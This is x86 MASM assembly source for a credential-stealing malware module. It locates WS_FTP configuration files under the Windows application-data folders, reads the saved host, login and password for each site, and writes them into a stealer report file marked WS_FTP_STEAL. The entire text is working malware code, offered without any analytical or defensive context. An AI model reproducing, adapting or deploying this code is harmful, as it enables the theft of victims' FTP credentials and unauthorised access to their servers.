.data?
      wsftp_buf1          db  100h   dup (?)
      wsftp_sections      db  1000h  dup (?)
      wsftp_host          db  100h   dup (?)
      wsftp_login         db  100h   dup (?)
      wsftp_pwd           db  400h   dup (?)
      
.code

WS_FTPRecCallback proc lpPath:DWORD, lpFilename:DWORD
      lstrcmp, addr wsftp_filename1, lpFilename
      .if     eax == 0
              jmp     ws_good_file
      .endif
      jmp     ws_mapping_error
    ws_good_file:
      push    lpPath
      call    _PathFindFileName
      mov     byte ptr [eax], 0
      lstrcat, lpPath, lpFilename
      
      push    dword ptr [lpPath]
      call    DecryptWS_FTP
      
    ws_mapping_error:
      ret
WS_FTPRecCallback endp

DecryptWS_FTP proc lpPath:DWORD
      
      GetPrivateProfileSectionNames, addr wsftp_sections, sizeof wsftp_sections, lpPath
      
      mov     ebx, offset wsftp_sections
    wsftp_section_lp:
      lstrlen, ebx
      test    eax, eax
      je      wsftp_all_sections_done
      
      ; user
      GetPrivateProfileString, ebx, addr wsftp_str1, 0, addr wsftp_host, sizeof wsftp_host, lpPath
      test    eax, eax
      je      wsftp_next_section
      ; pass
      GetPrivateProfileString, ebx, addr wsftp_str2, 0, addr wsftp_login, sizeof wsftp_login, lpPath
      test    eax, eax
      je      wsftp_next_section
      ; created
      GetPrivateProfileString, ebx, addr wsftp_str3, 0, addr wsftp_pwd, sizeof wsftp_pwd, lpPath
      test    eax, eax
      je      wsftp_next_section
      
      lstrlen, addr wsftp_host
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_HOST
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr wsftp_host, plen, addr SNW, NULL
      
      lstrlen, addr wsftp_login
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_LOGIN
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr wsftp_login, plen, addr SNW, NULL
      
      lstrlen, addr wsftp_pwd
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_PWD
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr wsftp_pwd, plen, addr SNW, NULL
      
    wsftp_next_section:
      lstrlen, ebx
      add     ebx, eax
      add     ebx, 1
      jmp     wsftp_section_lp
    wsftp_all_sections_done:
      
      ret
DecryptWS_FTP endp
      
GetWS_FTPPwd proc
      LOCAL   WTF:DWORD
      
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], WS_FTP_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetWS_FTPPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      ; appdata shit #1
      push    0
      push    CSIDL_APPDATA
      push    offset wsftp_buf1
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      push    offset wsftp_buf1
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr wsftp_buf1, addr wsftp_path1
      mov     recursive_index, 0
      push    offset WS_FTPRecCallback
      push    offset wsftp_buf1
      call    SomeRecursiveFunc
      
      ; appdata shit #2
      push    0
      push    CSIDL_COMMON_APPDATA
      push    offset wsftp_buf1
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      push    offset wsftp_buf1
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr wsftp_buf1, addr wsftp_path1
      mov     recursive_index, 0
      push    offset WS_FTPRecCallback
      push    offset wsftp_buf1
      call    SomeRecursiveFunc
      ; appdata shit #3
      push    0
      push    CSIDL_LOCAL_APPDATA
      push    offset wsftp_buf1
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      push    offset wsftp_buf1
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr wsftp_buf1, addr wsftp_path1
      mov     recursive_index, 0
      push    offset WS_FTPRecCallback
      push    offset wsftp_buf1
      call    SomeRecursiveFunc
      
    GetWS_FTPPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetWS_FTPPwd endp
